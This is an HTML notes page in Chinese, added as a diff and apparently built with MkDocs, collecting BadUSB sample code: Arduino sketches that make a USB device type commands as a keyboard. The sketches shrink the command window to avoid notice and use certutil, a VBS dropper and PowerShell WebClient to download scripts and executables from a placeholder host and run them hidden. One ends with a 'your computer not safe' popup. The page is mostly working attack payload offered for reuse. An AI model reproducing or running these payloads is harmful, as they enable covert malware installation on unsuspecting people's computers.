@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>BadUSB的一些示例代码 - Share Docs</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u6bd4\u8f83\u91cd\u8981\u7684\u6307\u4ee4", url: "#_top", children: [
+          ]},
+          {title: "\u793a\u4f8b\u4e00", url: "#_2", children: [
+          ]},
+          {title: "\u793a\u4f8b\u4e8c", url: "#_3", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Docker/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Docker/" class="btn btn-xs btn-link">
+        Docker
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../WAR3/%E5%9C%B0%E5%9B%BE%E6%96%87%E4%BB%B6%E8%AF%B4%E6%98%8E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../WAR3/%E5%9C%B0%E5%9B%BE%E6%96%87%E4%BB%B6%E8%AF%B4%E6%98%8E/" class="btn btn-xs btn-link">
+        地图文件说明
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <p>记录一下</p>
+<h2 id="_1">比较重要的指令</h2>
+<pre><code class="language-text-plain">Keyboard.press(KEY_CAPS_LOCK);  
+//切换大小写，由于中文输入法的原因，如果键盘处于中文输入状态，那么敲的代码都会变成拼音，所以需要切换大小写，如果键盘本身处于大写状态的话，那么用了这个就会切回小写状态。
+</code></pre>
+<pre><code class="language-text-plain">cmd /q /c mode con:COLS=15 LINES=1  
+//缩小cmd窗体到最小，尽可能的减少怀疑度吧
+</code></pre>
+<h2 id="_2">示例一</h2>
+<p>远程下载vbs脚本并运行</p>
+<pre><code class="language-text-plain">#include &lt;Keyboard.h&gt;
+void setup() {
+Keyboard.begin();
+delay(1000);
+Keyboard.press(KEY_LEFT_GUI);
+delay(200);
+Keyboard.press('r');
+delay(200); 
+Keyboard.release(KEY_LEFT_GUI);
+Keyboard.release('r'); 
+Keyboard.press(KEY_CAPS_LOCK);
+Keyboard.release(KEY_CAPS_LOCK);
+delay(300);
+Keyboard.println(&quot;cmd /q /c mode con:COLS=15 LINES=1 &amp;&amp; certutil -urlcache -split -f http://0.0.0.0:8888/run.vbs d:\\run.vbs &amp;&amp; timeout /t 1 &amp;&amp; start /B d:\\run.vbs&quot; );  //无回显
+//Keyboard.println(&quot;cmd /T:01 /K \&quot;@echo off &amp;&amp; mode con:COLS=15 LINES=1\&quot;&quot;);   //有回显
+Keyboard.press(KEY_RETURN); 
+Keyboard.release(KEY_RETURN); 
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+Keyboard.press(KEY_CAPS_LOCK); 
+Keyboard.release(KEY_CAPS_LOCK);
+Keyboard.end();
+}
+
+void loop() {
+
+}
+</code></pre>
+<p>vbs脚本</p>
+<p>远程下载bat运行</p>
+<pre><code class="language-text-plain">set ws=WScript.CreateObject(&quot;WScript.Shell&quot;)
+ws.Run &quot;cmd /c certutil -urlcache -split -f http://0.0.0.0:8888/POWERSHELL.BAT d:\\POWERSHELL.BAT &amp;&amp; start /B d:\\POWERSHELL.BAT&quot;,0
+</code></pre>
+<p>抄的k8gege的</p>
+<pre><code class="language-text-plain">echo strFileURL = &quot;http://0.0.0.0/1.exe&quot; &gt; K8.vbs
+echo strHDLocation = &quot;x.exe&quot; &gt;&gt; K8.vbs&quot;
+echo Set objXMLHTTP = CreateObject(&quot;MSXML2.XMLHTTP&quot;) &gt;&gt; K8.vbs
+echo objXMLHTTP.open &quot;GET&quot;, strFileURL, false &gt;&gt; K8.vbs
+echo objXMLHTTP.send() &gt;&gt; K8.vbs
+echo If objXMLHTTP.Status = 200 Then &gt;&gt; K8.vbs
+echo Set objADOStream = CreateObject(&quot;ADODB.Stream&quot;) &gt;&gt; K8.vbs
+echo objADOStream.Open &gt;&gt; K8.vbs
+echo objADOStream.Type = 1 &gt;&gt; K8.vbs
+echo objADOStream.Write objXMLHTTP.ResponseBody &gt;&gt; K8.vbs
+echo objADOStream.Position = 0 &gt;&gt; K8.vbs
+echo Set objFSO = Createobject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; K8.vbs
+echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation &gt;&gt; K8.vbs
+echo Set objFSO = Nothing &gt;&gt; K8.vbs
+echo objADOStream.SaveToFile strHDLocation &gt;&gt; K8.vbs
+echo objADOStream.Close &gt;&gt; K8.vbs
+echo Set objADOStream = Nothing &gt;&gt; K8.vbs
+echo End if &gt;&gt; K8.vbs
+echo Set objXMLHTTP = Nothing &gt;&gt; K8.vbs
+</code></pre>
+<h2 id="_3">示例二</h2>
+<p>利用powershell执行exe</p>
+<pre><code class="language-text-plain">#include&lt;Keyboard.h&gt;
+void setup(){
+Keyboard.begin();
+delay(3000);//延时
+Keyboard.press(KEY_CAPS_LOCK);
+Keyboard.press(KEY_LEFT_GUI);
+Keyboard.press(KEY_LEFT_GUI);
+delay(500);
+Keyboard.press('r');
+delay(500);
+Keyboard.release(KEY_LEFT_GUI);
+Keyboard.release('r');
+delay(500);
+Keyboard.press(KEY_CAPS_LOCK);
+delay(500);
+Keyboard.println(&quot;cmd&quot;);
+Keyboard.press(KEY_RETURN);
+delay(500);
+Keyboard.release(KEY_RETURN);
+Keyboard.println(&quot;powershell&quot;);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+Keyboard.println(&quot;$clnt=new-object system.net.webclient;&quot;);
+Keyboard.press(KEY_RETURN);
+delay(800);
+Keyboard.release(KEY_RETURN);
+Keyboard.println(&quot;$url='http://0.0.0.0:10880/ez.exe';&quot;);
+Keyboard.press(KEY_RETURN);
+delay(1000);
+Keyboard.release(KEY_RETURN);
+Keyboard.println(&quot;$file='c:\\windows\\temp\\ez.exe';&quot;);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+delay(800);
+Keyboard.println(&quot;$clnt.downloadfile($url,$file);&quot;);
+Keyboard.press(KEY_RETURN);
+delay(800);
+Keyboard.release(KEY_RETURN);
+Keyboard.println(&quot;start-process c:\\windows\\temp\\ez.exe -windowstyle hidden&quot;);
+Keyboard.press(KEY_RETURN);
+delay(800);
+Keyboard.release(KEY_RETURN);
+Keyboard.println(&quot;msg %username% /time:10 your computer not safe&quot;);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+Keyboard.println(&quot;cls&quot;);
+Keyboard.press(KEY_RETURN);
+delay(300);
+Keyboard.press(KEY_RETURN);
+Keyboard.press(KEY_RETURN);
+delay(300);
+Keyboard.press(KEY_RETURN);
+delay(300);
+Keyboard.press(KEY_RETURN);
+Keyboard.println(&quot;exit&quot;);
+Keyboard.press(KEY_RETURN);
+delay(300);
+Keyboard.press(KEY_RETURN);
+delay(300);
+Keyboard.println(&quot;exit&quot;);
+Keyboard.press(KEY_RETURN);
+delay(300);
+Keyboard.release(KEY_RETURN);
+Keyboard.println(&quot;exit&quot;);
+Keyboard.press(KEY_RETURN);
+delay(300);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+delay(300);
+Keyboard.end();
+
+}
+
+void loop()
+
+{
+
+}
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Docker/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Docker/" class="btn btn-xs btn-link">
+        Docker
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../WAR3/%E5%9C%B0%E5%9B%BE%E6%96%87%E4%BB%B6%E8%AF%B4%E6%98%8E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../WAR3/%E5%9C%B0%E5%9B%BE%E6%96%87%E4%BB%B6%E8%AF%B4%E6%98%8E/" class="btn btn-xs btn-link">
+        地图文件说明
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
